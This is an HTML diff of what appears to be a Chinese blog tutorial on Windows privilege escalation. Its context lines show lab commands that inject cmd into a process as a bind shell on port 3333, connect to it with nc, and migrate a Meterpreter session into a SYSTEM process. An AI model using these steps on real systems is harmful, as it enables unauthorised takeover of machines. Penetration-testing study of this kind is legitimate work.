@@ -229,7 +229,7 @@
             
               <p class="note note-info">
                 
-                  本文最后更新于：October 22, 2021 pm
+                  本文最后更新于：October 30, 2021 pm
                 
               </p>
             
@@ -287,6 +287,10 @@
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 被攻击主机</span><br>$ pinjector -l  <span class="hljs-comment"># 查看当前系统的进程以及创建该进程用户</span><br>$ pinjector -p 420 cmd 3333  <span class="hljs-comment"># inject.exe -p &lt;pid&gt; &lt;cmd&gt; &lt;port&gt; (Inject into PID)</span><br><br><span class="hljs-comment"># 攻击主机</span><br>nc &lt;IP&gt; 3333  <span class="hljs-comment"># 监听被攻击主机的IP及端口即可</span><br></code></pre></td></tr></table></figure>
 
 <p><strong>测试环境，Windows Server 2003 R2</strong></p>
+<img src="/img/Windows提权方式总结/10.gif" srcset="/img/loading.gif" lazyload>
+
+
+
 <h4 id="MSF进程注入"><a href="#MSF进程注入" class="headerlink" title="MSF进程注入"></a>MSF进程注入</h4><h5 id="环境-1"><a href="#环境-1" class="headerlink" title="环境"></a>环境</h5><p>msf Win 10：192.168.199.123</p>
 <p>被攻击主机 Windows Server 2008 R2：192.168.199.205</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash">...  <span class="hljs-comment"># 省略上线msf过程</span><br>meterpreter &gt; getuid  <span class="hljs-comment"># 当前权限为Administrator</span><br>Server username: WIN-SP8KQ566UEN\Administrator<br>meterpreter &gt; ps  <span class="hljs-comment"># 查看进程列表</span><br>meterpreter &gt; migrate 424  <span class="hljs-comment"># 迁移到424进程上去，该进程为system用户创建的</span><br>[*] Migrating from 3008 to 424...<br>[*] Migration completed successfully.<br>meterpreter &gt; getuid  <span class="hljs-comment"># 提权为system</span><br>Server username: NT AUTHORITY\SYSTEM<br></code></pre></td></tr></table></figure>
